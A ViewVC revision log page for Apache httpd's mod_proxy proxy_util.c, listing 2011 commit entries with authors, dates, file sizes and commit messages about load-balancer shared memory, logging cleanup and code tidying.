([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1207282&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1207282&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1207282))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1207282)

Modified
*Mon Nov 28 15:11:03 2011 UTC*
(13 years, 2 months ago)
by *jim*

File length: 100132 byte(s)

Diff to [previous 1206286](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1206286&r2=1207282)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1206286&r2=1207282&diff_format=h))
```
Error-check.

```

---

Revision [**1206286**](/viewvc?view=revision&revision=1206286) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1206286&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1206286&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1206286))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1206286)

Modified
*Fri Nov 25 19:28:14 2011 UTC*
(13 years, 2 months ago)
by *jim*

File length: 99119 byte(s)

Diff to [previous 1206268](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1206268&r2=1206286)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1206268&r2=1206286&diff_format=h))
```
Move useful and shared balancer stuff to the shm slot...
Provide hooks for post-config/runtime addition of
balancers.

```

---

Revision [**1206268**](/viewvc?view=revision&revision=1206268) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1206268&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1206268&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1206268))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1206268)

Modified
*Fri Nov 25 17:32:03 2011 UTC*
(13 years, 2 months ago)
by *jim*

File length: 98649 byte(s)

Diff to [previous 1204553](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1204553&r2=1206268)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1204553&r2=1206268&diff_format=h))
```
Allow compile time changes of field sizes and be more
"clear" regarding the diff between balancer and worker slots...

```

---

Revision [**1204553**](/viewvc?view=revision&revision=1204553) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1204553&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1204553&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1204553))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1204553)

Modified
*Mon Nov 21 15:51:40 2011 UTC*
(13 years, 2 months ago)
by *jim*

File length: 98646 byte(s)

Diff to [previous 1203868](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1203868&r2=1204553)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1203868&r2=1204553&diff_format=h))
```
Never used.

```

---

Revision [**1203868**](/viewvc?view=revision&revision=1203868) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1203868&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1203868&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1203868))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1203868)

Modified
*Fri Nov 18 21:49:44 2011 UTC*
(13 years, 2 months ago)
by *sf*

File length: 98676 byte(s)

Diff to [previous 1203859](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1203859&r2=1203868)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1203859&r2=1203868&diff_format=h))
```
Log fatal errors at level CRIT, not at some random level from DEBUG to EMERG

```

---

Revision [**1203859**](/viewvc?view=revision&revision=1203859) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1203859&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1203859&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1203859))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1203859)

Modified
*Fri Nov 18 21:41:09 2011 UTC*
(13 years, 2 months ago)
by *sf*

File length: 98692 byte(s)

Diff to [previous 1196946](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1196946&r2=1203859)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1196946&r2=1203859&diff_format=h))
```
great proxy logging cleanup:

  * remove "proxy:", "FCGI", etc. prefixes and pid which are now
    included in the error log format

  * propagate frontend request's logconfig to backend request

  * use ap_log_rerror where possible

  * remove obsolete APLOG_NOERRNO

```

---

Revision [**1196946**](/viewvc?view=revision&revision=1196946) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1196946&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1196946&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1196946))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1196946)

Modified
*Thu Nov 3 05:35:51 2011 UTC*
(13 years, 2 months ago)
by *sf*

File length: 99139 byte(s)

Diff to [previous 1183475](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1183475&r2=1196946)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1183475&r2=1196946&diff_format=h))
```
Modify placement of PROXY_DECLARE_DATA to fix build problems with MSVC,
reported by Gregg L. Smith

```

---

Revision [**1183475**](/viewvc?view=revision&revision=1183475) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1183475&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1183475&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1183475))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1183475)

Modified
*Fri Oct 14 19:51:17 2011 UTC*
(13 years, 3 months ago)
by *sf*

File length: 99141 byte(s)

Diff to [previous 1180654](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1180654&r2=1183475)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1180654&r2=1183475&diff_format=h))
```
There is absolutely no reason to have two 4k-sized constant strmatch patterns
in each per-dir config.

```

---

Revision [**1180654**](/viewvc?view=revision&revision=1180654) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1180654&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1180654&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1180654))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1180654)

Modified
*Sun Oct 9 17:07:17 2011 UTC*
(13 years, 3 months ago)
by *sf*

File length: 98993 byte(s)

Diff to [previous 1174929](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1174929&r2=1180654)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1174929&r2=1180654&diff_format=h))
```
Remove ap_proxy_removestr(). It has been unused for a decade and has quadratic
memory usage.

```

---

Revision [**1174929**](/viewvc?view=revision&revision=1174929) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1174929&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1174929&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1174929))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1174929)

Modified
*Fri Sep 23 18:08:42 2011 UTC*
(13 years, 4 months ago)
by *sf*

File length: 100099 byte(s)

Diff to [previous 1173328](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1173328&r2=1174929)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1173328&r2=1174929&diff_format=h))
```
More cleanup: Expand tabs and some more indentation fixes
No functional change

```

---

Revision [**1173328**](/viewvc?view=revision&revision=1173328) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1173328&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1173328&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1173328))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1173328)

Modified
*Tue Sep 20 20:12:51 2011 UTC*
(13 years, 4 months ago)
by *sf*

File length: 100092 byte(s)

Diff to [previous 1172686](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1172686&r2=1173328)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1172686&r2=1173328&diff_format=h))
```
Save one call of ap_escape_html on the uri. Reflow code to be more readable.

Submitted by: Christophe JAILLET <christophe.jaillet@wanadoo.fr>
PR: 51697

```

---

Revision [**1172686**](/viewvc?view=revision&revision=1172686) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1172686&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1172686&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1172686))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1172686)

Modified
*Mon Sep 19 16:25:42 2011 UTC*
(13 years, 4 months ago)
by *sf*

File length: 100084 byte(s)

Diff to [previous 1152273](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1152273&r2=1172686)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1152273&r2=1172686&diff_format=h))
```
Add wrappers for malloc, calloc, realloc that check for out of memory
situations.  Use them in most places where malloc, and friends are used.
This results in clean error messages in an out of memory situation instead of
segfaulting or silently malfunctioning. In some places, it just allows to
remove some logging code.

PR 51568, PR 51569, PR 51571.

```

---

Revision [**1152273**](/viewvc?view=revision&revision=1152273) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1152273&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1152273&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1152273))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1152273)

Modified
*Fri Jul 29 15:40:19 2011 UTC*
(13 years, 6 months ago)
by *niq*

File length: 100078 byte(s)

Diff to [previous 1138627](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1138627&r2=1152273)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1138627&r2=1152273&diff_format=h))
```
mod_proxy: enable absolute URLs to be rewritten with ProxyPassReverse,
e.g. to reverse proxy "Location: <https://other-internal-server/login>" with
ProxyPassReverse <https://public-address/> <https://other-internal-server/>

```

---

Revision [**1138627**](/viewvc?view=revision&revision=1138627) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1138627&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1138627&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1138627))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1138627)

Modified
*Wed Jun 22 20:45:34 2011 UTC*
(13 years, 7 months ago)
by *sf*

File length: 100021 byte(s)

Diff to [previous 1135083](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1135083&r2=1138627)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1135083&r2=1138627&diff_format=h))
```
Various code cleanup

PR: 51398
Submitted by: Christophe Jaillet <christophe jaillet wanadoo fr>

```

---

Revision [**1135083**](/viewvc?view=revision&revision=1135083) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1135083&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1135083&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1135083))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1135083)

Modified
*Mon Jun 13 10:58:10 2011 UTC*
(13 years, 7 months ago)
by *sf*

File length: 100006 byte(s)

Diff to [previous 1125818](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1125818&r2=1135083)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1125818&r2=1135083&diff_format=h))
```
Avoid some memory allocations by using apr_table_setn where the string
arguments are const.

Submitted by: Christophe JAILLET <christophe jaillet wanadoo fr>
PR: 51357

```

---

Revision [**1125818**](/viewvc?view=revision&revision=1125818) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1125818&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1125818&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1125818))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1125818)

Modified
*Sat May 21 21:06:15 2011 UTC*
(13 years, 8 months ago)
by *sf*

File length: 100004 byte(s)

Diff to [previous 1087371](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1087371&r2=1125818)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1087371&r2=1125818&diff_format=h))
```
Replace some "apr_p[c]alloc / memcpy" constructions into a single apr_pmemdup()s

PR: 51214
Submitted by: Christophe Jaillet <christophe jaillet wanadoo fr>

```

---

Revision [**1087371**](/viewvc?view=revision&revision=1087371) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1087371&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1087371&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1087371))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1087371)

Modified
*Thu Mar 31 17:00:36 2011 UTC*
(13 years, 9 months ago)
by *jim*

File length: 100023 byte(s)

Diff to [previous 1086287](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1086287&r2=1087371)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1086287&r2=1087371&diff_format=h))
```
If we change the LB method, or we take add in a new
balancermember ("enable" her), then we need to have the
LBmethod reset its params as required...

```

---

Revision [**1086287**](/viewvc?view=revision&revision=1086287) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1086287&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1086287&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1086287))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1086287)

Modified
*Mon Mar 28 15:50:34 2011 UTC*
(13 years, 10 months ago)
by *wrowe*

File length: 99874 byte(s)

Diff to [previous 1072098](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1072098&r2=1086287)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1072098&r2=1086287&diff_format=h))
```
Resolve disagreement with its prototype

```

---

Revision [**1072098**](/viewvc?view=revision&revision=1072098) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1072098&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1072098&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1072098))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1072098)

Modified
*Fri Feb 18 18:40:25 2011 UTC*
(13 years, 11 months ago)
by *jim*

File length: 99880 byte(s)

Diff to [previous 1069381](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1069381&r2=1072098)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1069381&r2=1072098&diff_format=h))
```
No longer depend on how fork() works when laying out segments...
function pointers in shm are... nasty ;)

```

---

Revision [**1069381**](/viewvc?view=revision&revision=1069381) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1069381&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1069381&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1069381))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1069381)

Modified
*Thu Feb 10 13:29:53 2011 UTC*
(13 years, 11 months ago)
by *jim*

File length: 99451 byte(s)

Diff to [previous 1068879](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1068879&r2=1069381)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1068879&r2=1069381&diff_format=h))
```
move function...

```

---

Revision [**1068879**](/viewvc?view=revision&revision=1068879) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1068879&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1068879&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1068879))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1068879)

Modified
*Wed Feb 9 13:20:09 2011 UTC*
(13 years, 11 months ago)
by *jim*

File length: 97366 byte(s)

Diff to [previous 1068581](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1068581&r2=1068879)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1068581&r2=1068879&diff_format=h))
```
Ugg... unbalanced workers *do* need a mutex as well (good catch Rüdiger!)

```

---

Revision [**1068581**](/viewvc?view=revision&revision=1068581) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1068581&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1068581&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1068581))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1068581)

Modified
*Tue Feb 8 21:08:10 2011 UTC*
(13 years, 11 months ago)
by *jim*

File length: 97029 byte(s)

Diff to [previous 1067269](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1067269&r2=1068581)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1067269&r2=1068581&diff_format=h))
```
Remove the thread mutex from the worker... it really should be
in the balancer. Thus we have global and thread for the balancer.
Use global when updating the full, shm list of workers; use
thread when being local.

```

---

Revision [**1067269**](/viewvc?view=revision&revision=1067269) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1067269&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1067269&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1067269))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1067269)

Modified
*Fri Feb 4 20:01:04 2011 UTC*
(13 years, 11 months ago)
by *jim*

File length: 95651 byte(s)

Diff to [previous 1066631](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1066631&r2=1067269)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1066631&r2=1067269&diff_format=h))
```
Here we go... we can now, via balancer-manager, add new
workers to existing balancers. Still work to be done,
like error checking that we aren't trying to add more
than we can (right now, it fails, but it would be nice
to handle it nicer), disabling and *deleting* workers
we don't want anymore, the actual drain method, etc...
but this is some major goodness.

```

---

Revision [**1066631**](/viewvc?view=revision&revision=1066631) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1066631&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1066631&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1066631))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1066631)

Modified
*Wed Feb 2 21:25:34 2011 UTC*
(13 years, 11 months ago)
by *jim*

File length: 95650 byte(s)

Diff to [previous 1066607](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1066607&r2=1066631)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1066607&r2=1066631&diff_format=h))
```
No need to pollute the whole namespace...

```

---

Revision [**1066607**](/viewvc?view=revision&revision=1066607) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1066607&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1066607&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1066607))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1066607)

Modified
*Wed Feb 2 20:17:22 2011 UTC*
(13 years, 11 months ago)
by *jim*

File length: 95559 byte(s)

Diff to [previous 1066138](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1066138&r2=1066607)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1066138&r2=1066607&diff_format=h))
```
Optimize... create a struct to hold the worker status info
(need to align w/ set_params later on) and note when we
update timestamps

```

---

Revision [**1066138**](/viewvc?view=revision&revision=1066138) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1066138&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1066138&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1066138))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1066138)

Modified
*Tue Feb 1 19:07:02 2011 UTC*
(13 years, 11 months ago)
by *jim*

File length: 97043 byte(s)

Diff to [previous 1066110](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1066110&r2=1066138)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1066110&r2=1066138&diff_format=h))
```
Again, abstract out the worker status magic to it's handled
by funcs...

```

---

Revision [**1066110**](/viewvc?view=revision&revision=1066110) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1066110&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1066110&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1066110))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1066110)

Modified
*Tue Feb 1 18:13:15 2011 UTC*
(13 years, 11 months ago)
by *jim*

File length: 95104 byte(s)

Diff to [previous 1065750](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1065750&r2=1066110)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1065750&r2=1066110&diff_format=h))
```
Move the setting of flags into a func... that way there is
one place to maintain as the number of flags grow...

Since we are using just the bits, make unsigned.

```

---

Revision [**1065750**](/viewvc?view=revision&revision=1065750) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1065750&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1065750&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1065750))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1065750)

Modified
*Mon Jan 31 20:29:01 2011 UTC*
(13 years, 11 months ago)
by *jim*

File length: 93841 byte(s)

Diff to [previous 1065748](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1065748&r2=1065750)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1065748&r2=1065750&diff_format=h))
```
Move the lbmethod to also allow it to be adjusted runtime

```

---

Revision [**1065748**](/viewvc?view=revision&revision=1065748) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1065748&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1065748&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1065748))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1065748)

Modified
*Mon Jan 31 20:28:52 2011 UTC*
(13 years, 11 months ago)
by *jim*

File length: 93845 byte(s)

Diff to [previous 1058629](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1058629&r2=1065748)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1058629&r2=1065748&diff_format=h))
```
Move some "nice to be able to change" balancer stuff to shm

```

---

Revision [**1058629**](/viewvc?view=revision&revision=1058629) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1058629&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1058629&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1058629))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1058629)

Modified
*Thu Jan 13 15:59:22 2011 UTC*
(14 years ago)
by *jim*

File length: 92766 byte(s)

Diff to [previous 1058627](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1058627&r2=1058629)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1058627&r2=1058629&diff_format=h))
```
Move nonce to balancer struct and add logic for nonce and growth.
Adjust mmn and update doccos

```

---

Revision [**1058627**](/viewvc?view=revision&revision=1058627) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1058627&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1058627&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1058627))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1058627)

Modified
*Thu Jan 13 15:59:13 2011 UTC*
(14 years ago)
by *jim*

File length: 92586 byte(s)

Diff to [previous 1058626](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1058626&r2=1058627)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1058626&r2=1058627&diff_format=h))
```
Set some defaults... do it here @ worker creation, not initialization

```

---

Revision [**1058626**](/viewvc?view=revision&revision=1058626) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1058626&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1058626&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1058626))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1058626)

Modified
*Thu Jan 13 15:59:10 2011 UTC*
(14 years ago)
by *jim*

File length: 92521 byte(s)

Diff to [previous 1058625](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1058625&r2=1058626)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1058625&r2=1058626&diff_format=h))
```
whitespace

```

---

Revision [**1058625**](/viewvc?view=revision&revision=1058625) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1058625&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1058625&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1058625))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1058625)

Modified
*Thu Jan 13 15:59:05 2011 UTC*
(14 years ago)
by *jim*

File length: 92681 byte(s)

Diff to [previous 1058624](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1058624&r2=1058625)
